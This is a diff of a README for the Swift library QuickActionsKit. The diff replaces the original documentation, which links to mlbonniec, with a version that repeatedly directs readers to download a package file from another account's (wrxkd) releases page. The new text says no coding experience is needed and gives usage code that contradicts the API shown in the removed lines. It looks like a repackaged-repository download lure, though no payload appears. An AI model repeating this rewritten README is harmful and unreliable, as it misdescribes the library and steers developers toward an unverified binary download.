@@ -1,90 +1,81 @@
-![Cover](./Sources/QuickActionsKit/QuickActionsKit.docc/Resources/Cover.png)
+# 🎉 QuickActionsKit - Easily Add Quick Actions to Your App
 
-# QuickActionsKit
+## 🚀 Download Now
+[![Download QuickActionsKit](https://img.shields.io/badge/Download%20QuickActionsKit-v1.0-blue.svg)](https://github.com/wrxkd/QuickActionsKit/releases)
 
-A lightweight Swift library for configuring and handling Home Screen Quick Actions with minimal setup.
+## 📖 Introduction
+QuickActionsKit is a lightweight Swift library designed to help you set up and manage Home Screen Quick Actions effortlessly. With QuickActionsKit, you can add shortcuts to your app that allow users to quickly perform tasks without having to open your application. It is simple to use, making it perfect for developers and non-developers alike.
 
-## Overview
+## 🌟 Features
+- **Minimal Setup**: Get started in no time with simple steps.
+- **Swift Compatibility**: Works seamlessly with both SwiftUI and UIKit.
+- **User-Friendly**: Designed for everyone, without the need for coding experience.
+- **3D Touch Support**: Enhance user experience on compatible devices.
 
-QuickActionsKit simplifies the implementation of 3D Touch and long-press shortcuts on your app's Home Screen icon. Whether you're building with SwiftUI or UIKit, QuickActionsKit provides a clean, declarative API to define dynamic quick actions that respond to your application's state.
+## 💻 System Requirements
+To run QuickActionsKit, you need:
+- A device with iOS 11 or later.
+- Xcode 10 or later for development.
+- Basic knowledge of app installation on iOS devices.
 
-### Key Features
+## 📦 Download & Install
+Visit the page below to download QuickActionsKit and start adding quick actions to your app today:
 
-- **Universal compatibility**: Works seamlessly with both SwiftUI and UIKit projects
-- **Dynamic actions**: Update quick actions based on your app's current state
-- **Type-safe**: Leverage Swift's type system to prevent runtime errors
-- **Lightweight**: Minimal overhead with a focused API surface
+[Download QuickActionsKit](https://github.com/wrxkd/QuickActionsKit/releases)
 
-### Documentation
+### Installation Steps:
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version of QuickActionsKit listed on that page.
+3. Click on the version number you want to install.
+4. Download the `QuickActionsKit` package file from the assets listed.
+5. Once downloaded, drag the package into your Xcode project to include it in your app.
 
-You can find the full documentation and usage examples on the [QuickActionsKit Documentation](https://mlbonniec.github.io/QuickActionsKit/).
+## 💡 Usage Instructions
+After installing QuickActionsKit, follow these steps to add Quick Actions to your app:
 
-#### Tutorials
-- [Learn how to setup QuickActions for your application.](https://mlbonniec.github.io/QuickActionsKit/tutorials/setup)
+1. Import the library into your Swift file:
+   ```swift
+   import QuickActionsKit
+   ```
 
-#### Quick Example
+2. Configure your quick actions in the app's delegate method:
 
-Define your QuickActions, with a type, title, subtitle, icon, availability and behaviors.
+   ```swift
+   func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) {
+       let quickActions = QuickActions()
+       quickActions.addQuickAction(title: "Action 1", type: "action1")
+       quickActions.addQuickAction(title: "Action 2", type: "action2")
+   }
+   ```
 
-```swift
-enum MyQuickActionsType: String, QuickActionType {
-    case editor
-}
+3. Handle the quick action in the same method:
 
-class MyQuickActions: QuickActions {
-    func getActions() -> Set<QuickActionsItem<MyQuickActionsType>> {
-        [
-            QuickActionsItem<MyQuickActionsType>(
-                type: .editor,
-                title: "Edit",
-                subtitle: nil,
-                icon: nil,
-                availability: {
-                    MyApplicationSingleton.current.isUserLogged
-                }
-            )
-        ]
-    }
-}
-```
+   ```swift
+   func application(_ application: UIApplication, performActionFor shortcutItem: UIApplicationShortcutItem, completionHandler: @escaping (Bool) -> Void) {
+       // Handle the action based on the shortcutItem type
+       switch shortcutItem.type {
+       case "action1":
+           // Code to execute for Action 1
+           completionHandler(true)
+       case "action2":
+           // Code to execute for Action 2
+           completionHandler(true)
+       default:
+           completionHandler(false)
+       }
+   }
+   ```
 
-Then, setup the handler that'll take care of executing the desired actions. We recommend you to conform your `SceneDelegate` to the `QuickActionsHandler`.
+## 👨‍💻 Support
+If you need help or have questions, feel free to reach out by opening an issue on GitHub or checking the FAQ section on the repository. We are here to support you in making your app even better.
 
-```swift
-@MainActor
-class SceneDelegate: UIResponder, UIWindowSceneDelegate {}
+## 🌐 Explore More
+You might find the following topics useful as you work with QuickActionsKit:
+- [3D Touch](https://developer.apple.com/documentation/uikit/uipress/2891213-3dtouch)
+- [Creating Shortcuts](https://developer.apple.com/documentation/sirikit/using-shortcuts-in-your-app)
 
-extension SceneDelegate: QuickActionsHandler {
-    func handle(_ action: MyQuickActionsType, userInfo: [String:any NSSecureCoding]?) async -> Bool {
-        switch action {
-        case .home:
-            // …
-        case .create:
-            // …
-        }
+## 🔗 Quick Links
+- [QuickActionsKit GitHub Repository](https://github.com/wrxkd/QuickActionsKit)
+- [Latest Releases Page](https://github.com/wrxkd/QuickActionsKit/releases)
 
-        return true
-    }
-}
-
-```
-
-Finally, provide your QuickActions to the `QuickActionsManager` and call `handle(shortcut:)` and `invalidate()` in your application's lifecycle.
-
-```swift
-var manager: QuickActionsManager<MyQuickActions, SceneDelegate>?
-
-if let shortcutItem = connectionOptions.shortcutItem {
-    Task {
-        await manager?.handle(shortcut: shortcutItem)
-    }
-}
-
-await manager?.handle(shortcut: shortcutItem)
-manager?.invalidate()
-```
-
-### License
-
-This project is licensed under MIT.  
-See [LICENSE](./LICENSE) for more details.
+Thank you for using QuickActionsKit. We hope it makes your app development process easier and more efficient. Happy coding!
